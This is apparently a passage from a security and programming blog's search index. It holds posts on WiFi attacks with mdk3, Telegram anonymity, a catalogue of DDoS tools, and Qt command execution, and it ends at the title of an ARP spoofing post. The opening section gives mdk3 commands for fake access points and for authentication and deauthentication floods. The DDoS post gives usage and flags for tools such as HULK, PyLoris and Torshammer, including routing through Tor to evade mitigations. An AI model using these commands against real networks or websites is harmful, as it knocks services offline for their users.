(Default: 50)P.S.1. Mass create fake APsFirstly, create a wifi_list.txt file, in the file stored all the AP’s names you want to create.For example:AP-0AP-1AP-2AP-3Then, start mdk3 with this command:$sudo mdk3 wlan0mon b -f /path/to/wifi_list.txt -t -c 6 P.S.2. Create fake APs with random names$sudo mdk3 wlan0mon bAuthentication DoS  Sends authentication frames to all APs found in range.Too much clients freeze or reset some APs.In some cases, the AP won’t freeze or reset, and even if it will not, it’s Internet speed will be very slow and hard to use.See all AP nearby:$sudo airodump-ng wlan0monCH  6 ][ Elapsed: 1 min ][ 2021-11-20 20:59  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSI 48:0E:EC:A1:8D:3F   -1        0        1    0   7   -1   WPA              &lt;len 00:1F:7A:52:62:B1   -1        0        0    0   6   -1                    &lt;len 88:C3:97:F0:D0:4C  -23       52        0    0   6  195   WPA2 CCMP   PSK   90:47:3C:06:7E:F0  -37       34        0    0   5  130   WPA2 CCMP   PSK   A8:C2:52:02:FC:A1  -45       37        0    0   1  270   WPA2 CCMP   PSK  &lt;len A8:C2:52:02:FC:A0  -45       29        3    0   1  270   WPA2 CCMP   PSK   7C:94:2A:88:CA:94  -45       34        0    0   6  270   WPA2 CCMP   PSK   A8:C2:52:02:FC:A5  -45       27        0    0   1  270   WPA2 CCMP   PSK  &lt;len 7C:94:2A:88:CA:95  -69       27        0    0   6  270   WPA2 CCMP   PSK  &lt;len 08:F4:58:D2:66:FD  -51       26        0    0  11  360   WPA2 CCMP   PSK  &lt;len 08:F4:58:D2:66:F8  -51       29        1    0  11  360   WPA2 CCMP   PSK   9C:A6:15:6D:BA:DB  -50       22        0    0  11  405   WPA2 CCMP   PSK   E4:BD:4B:AB:AD:08  -53       38        0    0   4  130   WPA2 CCMP   PSK   08:F4:58:D2:66:F9  -50       38        2    0  11  400   OPN               14:AD:CA:3A:21:5E  -53       39        0    0   8  270   WPA2 CCMP   PSK   E2:92:66:99:A8:0F  -52        0        1    0   6  130   WPA2 CCMP   PSK   74:54:27:60:F0:1A  -53       33        4    0   1  540   WPA2 CCMP   PSK  Start attack.Command:$sudo mdk3 wlan0mon a -a TARGET_MAC_ADDRESSDeauthentication / Disassociation AmokFrom sudo airodump-ng wlan0mon we get a lot of information. Access points, mac IDs, clients, channel on which each AP broadcasts etc. Now we choose a channel to attack against.Example:$sudo mdk3 wlan0mon d -c 11  #launch an attack against channel 11"
  },
  
  {
    "title": "Is Telegram really anonymous - IM softwares",
    "url": "/posts/telegram/",
    "categories": "Others",
    "tags": "Others, Pentest",
    "date": "2021-09-21 00:00:00 +0900",
    





    
    "snippet": "IntroductionNow, more and more people wants to be anonymous. The anonymity in everyday life enables people to be free to do many worthwhile things without feeling inhibited. Telegram, an IM known a...",
    "content": "IntroductionNow, more and more people wants to be anonymous. The anonymity in everyday life enables people to be free to do many worthwhile things without feeling inhibited. Telegram, an IM known as “focus on security and privacy”, is chosen. But, does Telegram really “focus on security and privacy” as it advertises? Today, we’ll compare Telegram with other IM software. I’ll show you different softwares’ advantage and disadvantage, and help you decide which one to choose.What is IM?Instant messaging (IM) technology is a type of online chat allowing real-time text transmission over the Internet or another computer network. Some example of IM:  WhatsApp  Slack  Jabber  Spark  Telegram  Signal  . . .About Telegram  Telegram is a free and open source, cross-platform, cloud-based instant messaging (IM) software. This service also provides end-to-end encrypted video calling, VoIP, file sharing and several other features.Advantages of Telegram  Telegram provides end-to-end encrypted voice and video calls and optional end-to-end encrypted “secret” chats. Cloud chats and groups are encrypted between the app and the server, so that ISPs and other third-parties on the network can’t access data, but the Telegram server can. Users can send text and voice messages, make voice and video calls, and share an unlimited number of images, documents (2 GB per file), user locations, animated stickers, contacts, and audio files.  Easy to use, user-friendly  Nice User Interface  Cross-platform(Windows, Android, iOS, OSX, Linux…)  Support setting chat records to be destroyed regularly  Support  deleting account, after deleting the account, all related information will be destroyed at the same time  Free, non-profit, never sell advertisements, never accept external investmentDisadvantages of TelegramWell, no data will be collected while using Telegram, end-to-end encryption is one hundred percent safe, but it doesn’t mean that Telegram is anoymous.In fact, Telegram has no anonymity1. Bind phone numberAny network tool that needs to be bound to a mobile phone (whether it is IM or email) will greatly reduce your invisibility.AnyoneGet contacts automatically once owns the phone number has the complete control over the Telegram account. I will talk about the issue of mobile phone number and anonymity below.Anyway, be sure to have control over the bound mobile phone number!2. Get contacts[can be solved]Telegram will scan your phone coanonymityntact and import numbers from it.Your can disable this function however.3. Last seen time[can be solved]Telegram will show your “Last seen time” defaultly, it may affect anonymity.So, it’s neccessary to set “Do not show last seen time” in Telegram. In some groups, Telegram will show accounts which is typing, there’s also a way to avoid this. Put your full name into line editor “Last Name” and leave a space in “FIrst Name”. Then your typing state won’t be shown.About phone numbersPhysical SIM cardsIn some countries, you’ll need to offer your true identity to get a SIM card. Obviously, it’s quite hard to keep anonymous with a physical SIM card.VoIPFree VoIPs are hard to get, and many of them have short avalible time. Moreover, using VoIP will have the risk of being deleted in Telegram(Deleted Account).Other IMsWhatsApp:  [✔️] User-friendly  [❌] Do not need to bind phone numbers.  [❓] Safety.  [❌] Anonymity.  [✔️] Is it popular?Signal:  [❌] User-friendly  [❌] Do not need to bind phone numbers.  [✔️] Safety.  [❌] Anonymity.  [✔️] Is it popular?Element(Riot):  [✔️] User-friendly  [✔️] Do not need to bind phone numbers.  [✔️] Safety.  [❌] Anonymity.  [❌] Is it popular?Wire:  [❌] User-friendly  [✔️] Do not need to bind phone numbers.  [✔️] Safety.  [❌] Anonymity.  [❌] Is it popular?Discord:  [✔️] User-friendly  [❌] Do not need to bind phone numbers.  [❓] Safety.  [❌] Anonymity.  [✔️] Is it popular?Wechat:  [❓] User-friendly  [❌] Do not need to bind phone numbers.  [❌] Safety.  [❌] Anonymity.  [✔️] Is it popular?Messenger:  [❓] User-friendly  [❌] Do not need to bind phone numbers.  [❌] Safety.  [❌] Anonymity.  [✔️] Is it popular?Tox:  [❌] User-friendly  [✔️] Do not need to bind phone numbers.  [✔️] Do not need to bind email.  [✔️] Safety.  [✔️] Anonymity.  [❌] Is it popular?BitMessage:  [❌] User-friendly  [✔️] Do not need to bind phone numbers.  [✔️] Do not need to bind email.  [✔️] Safety.  [✔️] Anonymity.  [❌] Is it popular?Bridgefy:  [❌] User-friendly  [✔️] Do not need to bind phone numbers.  [✔️] Do not need to bind email.  [❌] Safety.  [❌] Anonymity.  [❌] Is it popular?  [✔️] Offline messaging.  [❌ Only iOS &amp; Android]Cross-platformIdeal IM…All the mentioned IMs have their own advantages and disadvantages, so what is the best one? My answer is: neither of them. Which one to choose depends on your own ideas. For me, Telegram is safe enough and user-friendly.PS: Tips while using Telegram1. Set Passcode &amp; Face IDTo prevent others from peeking at the messages when the phone isn’t around.2. Two-step verification3. Privacy Settings  No one can see my numbers  No one can see my last seen time  Only contact can see profile photos  Only contact can call me  Only contact can add me in a group  Avoid using true numbers, use a VoIP instead  Use proxy  . . ."
  },
  
  {
    "title": "Collection of the best and most popular DDos-attack tools",
    "url": "/posts/ddos-tools/",
    "categories": "Pentest",
    "tags": "Pentest",
    "date": "2021-08-10 00:00:00 +0900",
    





    
    "snippet": "What is DDos?  In computing, a denial-of-service attack is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or in...",
    "content": "What is DDos?  In computing, a denial-of-service attack is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.How to get the collection?All the tools have been pushed to my github repository: Download: the0cp/awesome-ddos-tools  The collection will keep updating, adding new tools &amp; tutorials. Please Follow/Watch/Star to get the latest updating.DisclaimerAll collected tools and scripts come from the Internet and have passed the test, but we are not responsible for any undetected danger of software or scripts that may cause harm to your computer.LEGAL NOTICETHESE SOFTWARES AND SCRIPTS ARE PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY WE DO NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THESE SOFTWARES AND SCRIPTS YOU AGREE WITH THESE TERMS.Software &amp; Script Info1. LOIC (Low Orbit Ion Cannon_Windows)  LOIC is an open-source network stress testing and denial-of-service attack application, written in C#. LOIC was initially developed by Praetox Technologies, but was later released into the public domain, and now is hosted on several open source platforms.2. davoset  DDoS attacks via other sites execution tool. It is console (command line) tool for conducting DDoS attacks on the sites via Abuse of Functionality and XML External Entities vulnerabilities at other sites.3. ddosim  DDOSIM is a tool that can be used in a laboratory environment to simulate a distributed denial of service (DDOS) attack against a target server. … It simulates several zombie hosts (having random IP addresses) which create full TCP connections to the target server.4. GoldenEye  GoldenEye is an python app for security testing.GoldenEye is a HTTP DoS Test Tool.  Usage USAGE: ./goldeneye.py &lt;url&gt; [OPTIONS] OPTIONS:    Flag           Description                     Default    -u, --useragents   File with user-agents to use                     (default: randomly generated)    -w, --workers      Number of concurrent workers                     (default: 50)    -s, --sockets      Number of concurrent sockets                     (default: 30)    -m, --method       HTTP Method to use 'get' or 'post'  or 'random'  (default: get)    -d, --debug        Enable Debug Mode [more verbose output]          (default: False)    -h, --help         Shows this helpUtilities  util/getuas.py - Fetchs user-agent lists from http://www.useragentstring.com/pages/useragentstring.php subpages (ex: ./getuas.py http://www.useragentstring.com/pages/Browserlist/) REQUIRES BEAUTIFULSOUP4  res/lists/useragents - Text lists (one per line) of User-Agent strings (from http://www.useragentstring.com)LicenseThis software is distributed under the GNU General Public License version 3 (GPLv3)5. Hoic (High Orbit Ion Cannon)  Hoic is an open-source network stress testing and denial-of-service attack application designed to attack as many as 256 URLs at the same time. It was designed to replace the Low Orbit Ion Cannon which was developed by Praetox Technologies and later released into the public domain.6. HULK (HTTPS Unbearable Load King)Introduction  This script is a Distributed Denial of Service tool that can put heavy load on HTTPS servers,in order to bring them to their knees, by exhausting the resource pool.Its is meant for research purposes only and any malicious usage of this tool is prohibited.The authors aren’t to be held responsible for any consequence of usage of this tool. Authors : Hyperclaw79, version 3.0, 2.0; Barry Shteiman , version 1.0Usage  Run pip install -r requirements.txt before starting this script.  Launch the hulk-server.py with the target website as arg.  python hulk-server.py https://testdummysite.com      Launch the hulk-launcher.py to spawn multiple processes of hulk - one per CPU Core.  python hulk-launcher.py localhost          If it’s a bot on a remote client, replace localhost with the server’s IP.        Sit back and sip your coffee while the carnage unleashes! &gt;:DLicenseHULK v3 is a Python 3 compatible Asynchronous Distributed Denial of Service Script.Original script was created by Barry Shteiman.You can use that one if you have Python 2.Using a GNU license cause there was no mention about any license used by Barry.Feel free to modify and share it, but leave some credits to us both and don’t hold us liable.7. pyloris  Using HTTPLoris is simple. In its most basic form, HTTPLoris merely needs a copy of Python 2.6.UsageOn a Linux machine, one must simply invoke the script in a terminal, stating a site to test:motoma@rocksalt:/home/motoma$ python pyloris-3.0.py motomastyle.comOn Mac OS X, one invokes PyLoris the same way. Using the Terminal Application:hotdog:/Users/Motoma/ motoma$ python pyloris-3.0.py motomastyle.comUsing HTTPLoris in Windows is a little different. One will need to know the location of the Python installation, and be in the proper directory. Load up a command prompt:C:\\Users\\Motoma\\Desktop\\pyloris-3.0&gt;C:\\Python26\\python.exe pyloris-3.0.py motomastyle.comAdvanced OptionsInvoking HTTPLoris by using the commands above start a limited to 500 connections across 50 threads, each sending at 1 byte/second and waiting until the connection is forced shut by the server. While this behavior will bog down an Apache server with the default settings, it is not a very thorough test. The following are some additionall options that will allow one to customize the way HTTPLoris works:-a, --attacklimitThe --attacklimit flag restricts the number of total connections (current + completed) during a single session. Set this to zero to specify no limit.-c, --connectionlimitAdjusting the --connectionlimit flag can drastically change how well HTTPLoris performs. The --connectionlimit flag directly controls the number of concurrent connections held during the session. In a base Apache environment, when this number is above the MaxClients setting, the server is unresponsive.-t, --threadlimitThis is the number of attacker threads run during the session.-b, --connectionspeedThis is the connection speed for each individual connection in bytes/second. Comparing this with the lenght of the request, and you should have an accurate guess of how long each connection should linger.-f, --finishSpecifying the --finish flag will cause HTTPLoris to finish and close connections upon the completion of the request. This will prompt servers to send full responses to the HTTP requests that are made.-k --keepaliveUsing the --keepalive flag will add the Connection: Keep-Alive header to the HTTP request. On vulnerable servers, this will increase the duration of connections considerably.-p, --portHTTPLoris will connect on port 80 by default. Specifying the --port flag will change this behavior.-P, --pageBy default, HTTPLoris will make HTTP requests for \"/\". Setting the --page flag will allow one to control the page that HTTPLoris requests.-q, --quitTerminate the connection without receiving reply from the server. This will reduce the effectivenes as connections will terminate as soon as the full request buffer has been sent.-r, --requesttypeSetting the --requesttype flag will change the HTTP method used. Available options are GET, HEAD, POST, PUT, DELETE, OPTIONS, and TRACE. Certain proxies and load balancers will filter out certain types of requests, and hold them until the requests are complete. POST requests are commonly passed through due to their potential for large sizes, therefore this may cause different behavior.-R, --refererAdds a referring URL to the HTTP request.-s, --SizeThe --size flag allows one to increase the size of the request made. Increasing the size will in turn increase the duration of connections, leading to a longer sustained test. In situations where servers or firewalls are set to terminate unfinished connections, this can extend the length of the test drastically. This can also be used to test a web server's capability to handle multiple large requests and benchmark memory usage. The additional data is filled in the Cookie-Data field.-u, --useragentBy default, HTTPLoris advertizes itself in the User-Agent header. The --useragent flag allows one to override this and masquerade as other web browsers. Useful because some sites will render different pages for different web browsers. -z, --gzipSpecifying the --gzip flag will allow instruct PyLoris to send an \"Accept-Encoding: gzip\" header. When combined with the --quit and --finish flags, this can test for the CEV-2009-1891 DoS vulnerability (http://www.mail-archive.com/dev@httpd.apache.org/msg44323.html). Also leads to larger CPU usage and smaller bandwidth usage.-w, --timebetweenthreadsSetting the --timebetweenthreads flag will adjust the amount of time between threads spawning. Adjusting this in conjunction with the --threadlimit will change the CPU load on your local machine.-W, --timebetweenconnectionsSetting the --timebetweenconnections flag will adjust the amount of time between socket connections. This will directly affect how quickly the target's connection limit is reached.Proxy Options HTTPLoris is able to connect through SOCKS4, SOCKS5, and HTTP proxies. This allows HTTPLoris to run through SSH tunnels, as well as TOR. Utilizing TOR should essentially eliminate the mitigating effects of ipchains, mod_antiloris, and mod_noloris.--socksversionSetting the --socksversion flag tells HTTPLoris to connect through a SOCKS proxy. Allowed values are SOCKS4, SOCKS5, and HTTP.--sockshostSet the --sockshost flag to the address of the SOCKS proxy when --socksversion is set. If this is not set, HTTPLoris will default to 127.0.0.1.--socksportSet the --socksport flag to the port number of the SOCKS proxy when --socksversion is set. --socksuser and --sockspassOptionally, one may set a username and password for the SOCKS proxy using these two flags.8. Rudy (R U Dead yet)  ‘R U Dead Yet?’ or R.U.D.Y. is a denial-of-service attack tool that aims to keep a web server tied up by submitting form data at an absurdly slow pace. A R.U.D.Y. exploit is categorized as a low-and-slow attack, since it focuses on creating a few drawn-out requests rather than overwhelming a server with a high volume of quick requests. A successful R.U.D.Y. attack will result in the victim’s origin server becoming unavailable to legitimate traffic.The R.U.D.Y. software includes a user-friendly point-and-click interface, so all an attacker needs to do is point the tool at a vulnerable target. Any web service that accepts form input is vulnerable to a R.U.D.Y. attack, since the tool works by sniffing out form fields and exploiting the form submission process.9. TorshammerUSAGE:./torshammer.py -t &lt;target&gt; [-r &lt;threads&gt; -p &lt;port&gt; -T -h]-t|--target &lt;Hostname|IP&gt;-r|--threads &lt;Number of threads&gt; Defaults to 256-p|--port &lt;Web Server Port&gt; Defaults to 80-T|--tor Enable anonymising through tor on 127.0.0.1:9050-h|--help Shows this helpEg. ./torshammer.py -t 192.168.1.100 -r 25610. hpingDESCRIPTION hping3 is a network tool able to send custom TCP/IP packets and to display target replies like ping do with ICMP replies. hping3 can handle fragmentation, and almost arbitrary packet size and content, using the command line interface. Since version 3, hping implements scripting capabilties, read the API.txt file under the /docs directory to know more about it. As a command line utility, hping is useful to test at many kind of networking devices like firewalls, routers, and so. It can be used as a traceroute alike program over all the supported protocols, firewalk usage, OS fingerprinting, port-scanner (see the --scan option introduced with hping3), TCP/IP stack auditing. It's also really a good didactic tool to learn TCP/IP. Using Tcl/Tk scripting much more can be done, because while the hping3 packet generation code is actually the hping2 put there mainly for compatibility with the command line interface, all the real news are about scripting. See the libs directory for example scripts. To run the example scripts type:  hping3 exec ScriptName.htcl &lt;arguments, if required&gt; hping3 is developed and manteined by antirez@invece.org with the help of other hackers, and comes under GPL version 2 of license. Development is open so you can send me patches/suggestions/affronts without inhibitions. Please check the AUTHORS file for a list of people that contribued with code, ideas, bug reports. Also vim developer, ee.lbl.gov for tcpdump and GNU in general.DOCUMENTATION For the hping3 API check docs/API.txt You can find documentation about hping3 specific functions at http://wiki.hping.org Make sure to check the page at http://wiki.hping.org/34REQUIREMENTS A supported unix-like OS, gcc, root access. Libpcap. Tcl/Tk is optional but strongly suggested.INSTALLATION see INSTALL file.have fun,antirez11. #RefrefRefref - An SQLi injection DDOS tool12. HyenaeFeatures      ARP-Request flooding    ARP-Cache poisoning  PPPoE session initiation flooding  Blind PPPoE session termination  ICMP-Echo flooding  ICMP-Smurf attack  ICMP based TCP-Connection reset  TCP-SYN flooding  TCP-Land attack  Blind TCP-Connection reset  UDP flooding  DNS-Query flooding  DHCP-Discover flooding  DHCP starvation attack  DHCP-Release forcing  Cisco HSRP active router hijacking  Pattern based packet address configuration  Intelligent address and address protocol detection  Smart wildcard-based randomization  Daemon for setting up remote attack networks - HyenaeFE QT-Frontend support13. Boom(Python)14. RCPnet  A multi-tool for network pen-testing written in python. It contains effective ping functions, hostname traceroute, and cloudflare detection. This is a modification from the FoxNuke Project, which only intended to be a DOS tool for network pen testing.15. MaddStress  MaddStress is a simple denial-of-service (DDoS) attack tool that refers to attempts to burden a network or server with requests, making it unavailable to users.Features      Strongest &amp; Best DDoS Tools    UDP Configuration  TCP Configuration  SYN Configuration  Proxy Configuration  URL Grabber  Port Scanner  CloudFlare Resolver  Multi CloudFlare Resolver  Proxy Attack &amp; Generator  Always Updates &amp; Current News  System Information  Network Information  Simple Design UI  User friendly GUI16. Dequiem  Dequiem is a DDoS tool written in python 2.7Features      DDoS    Find a website’s IP  Port Scanning17. NEMESIS  NEMESIS is tool like torshammer or pyloic, used to Distributed Denial of Service attacks, writen in C#18. ChiHULK  Written in python 2.7Edited version of the DDoS / DoS tool called HULK(.py).19. PentaDos  Written in python 2.7A tool designed by members of PentagonCrew to helpyou easily take down websites. Ethical uses only20. Moihack DoS Attack Tool Reloaded  A simple TCP/UDP Port Flooder written in Python.21. Slowloris22. AnDDoS  Stealth Anonymous Kill-The-Server  The classic DDoS! Overload the server.23. torDDosAuthor: r3nt0nTorDDos is a Python tool to automatize DDos attacks to a website from the Tor network.Usage  -h, --help        show this help message and exit  -t , --target     server to kick-out  -n , --attempts   number of attempts of attack (default: 5)How it works      Creates a new Tor session.    Makes a request to the website you choose as a target.  Releases the Tor session, then creates another and request data again to the website.Requirements      Linux system    Python 2.7  Tor service  requestsLegal disclaimerThis tool is created for the sole purpose of security awareness and education, it should not be used against systems that you do not have permission to test/attack. The author is not responsible for misuse or for any damage that you may cause. You agree that you use this software at your own risk."
  },
  
  {
    "title": "Solve Qt: libpng warning: iCCP: known incorrect sRGB profile",
    "url": "/posts/qt-libpng/",
    "categories": "Qt",
    "tags": "Qt",
    "date": "2021-07-26 00:00:00 +0900",
    





    
    "snippet": "Why this happens?This warning is mainly related to the format of the PNG image. In fact, to solve this warning, we just need to convert the image to a correct profile. There are many ways to solve ...",
    "content": "Why this happens?This warning is mainly related to the format of the PNG image. In fact, to solve this warning, we just need to convert the image to a correct profile. There are many ways to solve this in both Windows and Linux.WindowsMethod 1: ImageMagickWe use ImageMagick to convert the image: ImageMagick Official  Download the corresponding compressed package according to the platform (such as Windows x64)  Unzip the downloaded compressed package to anywhere you want, we suppose your target path is $PATH.  Create a new .bat file in the PNG folder, for example convert.bat.  Edit the content of convert.bat:@echo offecho ImageMagick is fixing libpng warningset fn = $PATH\\convert.exefor /f \"tokens=*\" %%i in ('dir/s/b *.png') do \"%fn%\" \"%%i\" -strip \"%%i\"pause  Save the convert.bat, then double click to run it.Method 2: Photoshop  Open the image with Photoshop.  Click Edit on the tool bar.  Change the image profile to “Adobe RGB (1998)”.Method 3: QImageQImage img;img.load(\"1.png\");img.save(\"1.png\");LinuxMethod 1: convertIt’s the easiest way to solve the warning in Linux:$ convert input.png output.pngIf you don’t have a convert command, just install it, it is included in ImageMagick:$ sudo apt-get install imagemagick$ convert -versionconvert also has many more excellent functions, you can resize your image like this:$ convert -resize 1024x1024 input.png output.pngRotate the image:$ convert -rotate 270 input.png output.png    #clockwise rotate 270 degreesEven add characters:$ convert -fill COLOR -pointsize SIZE -font FONT -draw 'text X,Y \"Hello, World!\"' input.png output.png And many more…Method 2: QImage()QImage img;img.load(\"1.png\");img.save(\"1.png\");"
  },
  
  {
    "title": "Run a command in Qt without displaying the CMD window",
    "url": "/posts/qtcmd/",
    "categories": "Qt",
    "tags": "Qt, C/C++",
    "date": "2021-06-25 00:00:00 +0900",
    





    
    "snippet": "Method 1: system​ It’s the most basic method not only used in Qt, you should include the library stdlib.h.​ But, you have to see the ugly black cmd window.            Header                  stdlib...",
    "content": "Method 1: system​ It’s the most basic method not only used in Qt, you should include the library stdlib.h.​ But, you have to see the ugly black cmd window.            Header                  stdlib.h      Syntaxint system (const char* command);Parameterscommand:​  C-string containing the system command to be executed.Or, alternatively, a null pointer, to check for a command processor.Return Value​  If command is a null pointer, the function returns a non-zero value in case a command processor is available and a zero value if it is not.If command is not a null pointer, the value returned depends  on the system and library implementations, but it is generally expected  to be the status code returned by the called command, if supported.Example/******example: ping******/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ printf(\"checking processor\\n\"); if (system(NULL)) puts (\"Ok\");     else exit (EXIT_FAILURE); printf(\"start ping\\n\"); system(\"ping localhost &gt;&gt; res.txt\"); return 0;}​ You can see the ping’s result in res.txt after running these code.Is here some method I can take to avoid displaying the cmd window? The answer is: YES.Method 2： WinExec – without cmd window​ WinExec() is another way to run a command, the advantage of using WinExec() is you don’t need to display the window, it means, you can hide the window. It needs winbase.h &amp; windows.h.​ BUT, this function is provided only for compatibility with 16-bit Windows. Applications should use the  CreateProcess() function(as follows).            Header                  windows.hwinbase.h      SyntaxUINT WinExec(  LPCSTR lpCmdLine,  UINT   uCmdShow);ParameterslpCmdLine:​ The command line (file name plus optional parameters) for the application to be executed.uCmdShow:​ The display options.​ List of the acceptable values:            Value      Meaning                  SW_HIDE 0      Hides the window and activates another window.              SW_SHOWNORMAL SW_NORMAL 1      Activates and displays a window. If the window is minimized or  maximized, the system restores it to its original size and position. An  application should specify this flag when displaying the window for the  first time.              SW_SHOWMINIMIZED 2      Activates the window and displays it as a minimized window.              SW_SHOWMAXIMIZED SW_MAXIMIZE 3      Activates the window and displays it as a maximized window.              SW_SHOWNOACTIVATE 4      Displays a window in its most recent size and position. This value is similar to SW_SHOWNORMAL, except that the window is not activated.              SW_SHOW 5      Activates the window and displays it in its current size and position.              SW_MINIMIZE 6      Minimizes the specified window and activates the next top-level window in the Z order.              SW_SHOWMINNOACTIVE 7      Displays the window as a minimized window. This value is similar to SW_SHOWMINIMIZED, except the window is not activated.              SW_SHOWNA 8      Displays the window in its current size and position. This value is similar to SW_SHOW, except that the window is not activated.              SW_RESTORE 9      Activates and displays the window. If the window is minimized or  maximized, the system restores it to its original size and position. An  application should specify this flag when restoring a minimized window.              SW_SHOWDEFAULT 10      Sets the show state based on the SW_ value specified in the STARTUPINFO structure passed to the CreateProcess() function by the program that started the application.              SW_FORCEMINIMIZE 11      Minimizes a window, even if the thread that owns the window is not  responding. This flag should only be used when minimizing windows from a different thread.      Return value​ If the function succeeds, the return value is greater than 31.​ If the function fails, the return value is one of the following error values.            Return code/value      Description                  0      The system is out of memory or resources.              ERROR_BAD_FORMAT      The .exe file is invalid.              ERROR_FILE_NOT_FOUND      The specified file was not found.              ERROR_PATH_NOT_FOUND      The specified path was not found.      Example/******example: ping******/#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;winbase.h&gt;int main(){ printf(\"start ping\\n\"); WinExec(\"cmd.exe /c ping localhost &gt;&gt; res.txt\", SW_HIDE);  /* '/c' can't be ignored as you have arguments after 'cmd.exe' */ return 0;}​ With this function you cannot determine whether the command is completed, because it is executed asynchronously.​ You must use CreateProcess() to solve the problem.Method 3: CreateProcess – without cmd window​ This function is used to run a new program. It creates a new process and its primary thread. The new process executes the specified executable file.            Header                  windows.h      SyntaxBOOL CreateProcess(  LPCWSTR lpszImageName,  LPCWSTR lpszCmdLine,  LPSECURITY_ATTRIBUTES lpsaProcess,  LPSECURITY_ATTRIBUTES lpsaThread,  BOOL fInheritHandles,  DWORD fdwCreate,  LPVOID lpvEnvironment,  LPWSTR lpszCurDir,  LPSTARTUPINFOW lpsiStartInfo,  LPPROCESS_INFORMATION lppiProcInfo); ParameterslpszImageName:  Pointer to a null-terminated string that specifies the module to execute.​ The string can specify the full path and filename of the module to execute or it can specify a partial path and filename.​ The lpszImageName parameter must be non-NULL and must include the module name.lpszCmdLine:  Pointer to a null-terminated string that specifies the command line to  execute. The system adds a null character to the command line, trimming  the string if necessary, to indicate which file was actually used.​ The lpszCmdLine parameter can be NULL. In that case, the function uses the string pointed to by lpszImageName as the command line.​ If both lpszImageName and lpszCmdLine are non-NULL, *lpszImageName specifies the module to execute, and *lpszCmdLine specifies the command line. C runtime processes can use the argc and argvarguments.​ If the filename does not contain an extension, .EXE is assumed. If  the filename ends in a period (.) with no extension, or the filename  contains a path, .EXE is not appended.lpsaProcess:  Process safety attributeslpsaThread:  Thread safety attributesfInheritHandles:  Whether to inherit the attributes of the parent processfdwCreate:  Specifies additional flags that control the priority class and the  creation of the process. The following creation flags can be specified  in any combination, except as noted:            Value      Description                  CREATE_DEFAULT_ERROR_MODE      Not supported.              CREATE_NEW_CONSOLE      The new process has a new console, instead of inheriting the  parent’s console. This flag cannot be used with the DETACHED_PROCESS  flag.              CREATE_NEW_PROCESS_GROUP      Not supported.              CREATE_SEPARATE_WOW_VDM      Not supported.              CREATE_SHARED_WOW_VDM      Not supported.              CREATE_SUSPENDED      The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called.              CREATE_UNICODE_ENVIRONMENT      Not supported.              DEBUG_PROCESS      If this flag is set, the calling process is treated as a debugger,  and the new process is a process being debugged. Child processes of the  new process are also debugged. The system notifies the debugger of all  debug events that occur in the process being debugged.                     If you create a process with this flag set, only the calling thread (the thread that called CreateProcess) can call the WaitForDebugEvent function.              DEBUG_ONLY_THIS_PROCESS      If this flag is set, the calling process is treated as a debugger,  and the new process is a process being debugged. No child processes of  the new process are debugged. The system notifies the debugger of all  debug events that occur in the process being debugged.              DETACHED_PROCESS      Not supported.      lpvEnvironment:  Pointer to current environment.lpszCurDir:  Pointer to current directory.lpsiStartInfo:  Pointer to STARTUPINFO structurelppiProcInfo:  Pointer to a PROCESS_INFORMATION structure that receives identification information about the new process.ExampleHere’s the Microsoft’s example:#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tchar.h&gt;void _tmain( int argc, TCHAR *argv[] ){    STARTUPINFO si;    PROCESS_INFORMATION pi;    ZeroMemory( &amp;si, sizeof(si) );    si.cb = sizeof(si);    si.wShowWindow = SW_HIDE; //hide window    ZeroMemory( &amp;pi, sizeof(pi) );    // Start the child process.     if( !CreateProcess( NULL,   // No module name (use command line)        \"cmd.exe /c ping localhost &gt;&gt; res.txt\",        // Command line        NULL,           // Process handle not inheritable        NULL,           // Thread handle not inheritable        FALSE,          // Set handle inheritance to FALSE        0,              // No creation flags        NULL,           // Use parent's environment block        NULL,           // Use parent's starting directory         &amp;si,            // Pointer to STARTUPINFO structure        &amp;pi )           // Pointer to PROCESS_INFORMATION structure    )     {        printf( \"CreateProcess failed (%d).\\n\", GetLastError() );        return;    }    // Wait until child process exits.    WaitForSingleObject( pi.hProcess, INFINITE );    // Close process and thread handles.     CloseHandle( pi.hProcess );    CloseHandle( pi.hThread );}Method 4： QProcess – without cmd windowThe QProcess class is used to start external programs and to communicate with them. It’s a modern method to run a command.            Header      QProcess                  qmake      QT += core      Examples QProcess p(0);    p.start(\"cmd\", QStringList()&lt;&lt;\"/c\"&lt;&lt;\"ping localhost &gt;&gt; res.txt\");    p.waitForStarted();    p.waitForFinished();Another way:QProcess p(0);QString command = \"cmd.exe\";QStringList args;args.append(\"/c\");args.append(\"ping\");args.append(\"localhost\");args.append(\"&gt;&gt;\");args.append(\"res.txt\");p.execute(command, args);p.waitForFinished();//p.start(command, args);//p.waitForStarted();//p.waitForFinished();Full example//file: \"mainwindow.h\"#ifndef MAINWINDOW_H  #define MAINWINDOW_H  #include &lt;QtGui&gt;  class MainWindow : public QMainWindow  {      Q_OBJECT  public:      MainWindow(QWidget *parent = 0);          ~MainWindow();  private slots:      void openProcess();         void readResult(int exitCode);  private:      QProcess *p;  };  #endif // MAINWINDOW_H //file: \"mainwindow.cpp\"#include \"mainwindow.h\"   MainWindow::MainWindow(QWidget *parent)      : QMainWindow(parent)  {      p = new QProcess(this);      QPushButton *bt = new QPushButton(\"execute\", this);      connect(bt, SIGNAL(clicked()), this, SLOT(openProcess()));  }   MainWindow::~MainWindow()  {   }   void MainWindow::openProcess()  {      p-&gt;start(\"cmd.exe\", QStringList() &lt;&lt; \"/c\" &lt;&lt; \"ping localhost &gt;&gt; res.txt\");      connect(p, SIGNAL(finished(int)), this, SLOT(readResult(int)));  }   void MainWindow::readResult(int exitCode)  {      if(exitCode == 0)     {          QTextCodec* gbkCodec = QTextCodec::codecForName(\"GBK\");          QString result = gbkCodec -&gt; toUnicode(p -&gt; readAll());       }  }  At lastAt last, I recommand QProcess and CreateProcess."
  },
  
  {
    "title": "ARP Spoofing in the internal network",
    "url": "/posts/arp-spoofing/",
    "categories": "Pentest",
    "tags": "Pentest, Linux",
